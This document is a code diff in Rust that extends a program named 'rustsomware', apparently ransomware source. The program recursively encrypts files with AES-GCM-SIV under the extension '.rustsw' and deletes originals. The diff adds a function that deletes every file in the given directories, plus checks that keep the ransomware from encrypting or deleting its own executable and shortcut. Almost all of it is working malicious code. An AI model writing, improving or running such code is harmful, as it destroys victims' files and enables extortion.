@@ -6,10 +6,11 @@ use aes_gcm_siv::{Aes128GcmSiv, Aes256GcmSiv, Key, Nonce};
 use rand::prelude::*;
 use rand_hc::Hc128Rng;
 use std::fs;
-use std::path;
+use std::path::{self, Path};
 use walkdir::WalkDir;
 
 const ENCRYPTED_EXTENSION: &str = ".rustsw";
+const ENCRYPTED_EXTENSION_WITHOUT_DOT: &str = "rustsw";
 
 pub struct Encryptor256bit {
     nonce: GenericArray<u8, UInt<UInt<UInt<UInt<UTerm, B1>, B1>, B0>, B0>>,
@@ -71,6 +72,15 @@ impl Encryptor256bit {
 
     pub fn encrypt_files(&self, files: &Vec<String>) {
         for file in files {
+            match Path::new(&file).extension() {
+                Some(ext) => {
+                    if ext.to_str() == Some(ENCRYPTED_EXTENSION_WITHOUT_DOT) {
+                        continue;
+                    }
+                }
+                None => (),
+            }
+
             println!("Name: {}", &file); // HACK DEBUG print
             self.encrypt_file_else_delete(&file);
 
@@ -78,6 +88,27 @@ impl Encryptor256bit {
                 Ok(_) => (),
                 Err(_) => (),
             };
+        }
+    }
+
+    pub fn delete_files_in_dirs(&self, dirs: &Vec<String>) {
+        for dir in dirs {
+            let files = self.get_files_recursively(&dir);
+
+            for file in files {
+                match Path::new(&file).file_name() {
+                    Some(name) => {
+                        let name = name.to_str();
+                        if name == Some("rustsomware.exe") || name == Some("rustsomware.exe.lnk") {
+                            continue;
+                        }
+                    }
+                    None => (),
+                }
+
+                self.attempt_delete_file(&file);
+                println!("{}", &file.to_string());
+            }
         }
     }
 
@@ -151,6 +182,25 @@ impl Encryptor128bit {
 
     pub fn encrypt_files(&self, files: &Vec<String>) {
         for file in files {
+            let path = Path::new(&file);
+            match path.extension() {
+                Some(ext) => {
+                    if ext.to_str() == Some(ENCRYPTED_EXTENSION_WITHOUT_DOT) {
+                        continue;
+                    }
+                }
+                None => (),
+            }
+
+            match path.file_name() {
+                Some(name) => {
+                    if name.to_str() == Some("rustsomware.exe") {
+                        continue;
+                    }
+                }
+                None => (),
+            }
+
             println!("Name: {}", &file); // HACK DEBUG print
             self.encrypt_file_else_delete(&file);
 
@@ -166,6 +216,16 @@ impl Encryptor128bit {
             let files = self.get_files_recursively(&dir);
 
             for file in files {
+                match Path::new(&file).file_name() {
+                    Some(name) => {
+                        let name = name.to_str();
+                        if name == Some("rustsomware.exe") || name == Some("rustsomware.exe.lnk") {
+                            continue;
+                        }
+                    }
+                    None => (),
+                }
+
                 self.attempt_delete_file(&file);
                 println!("{}", &file.to_string());
             }
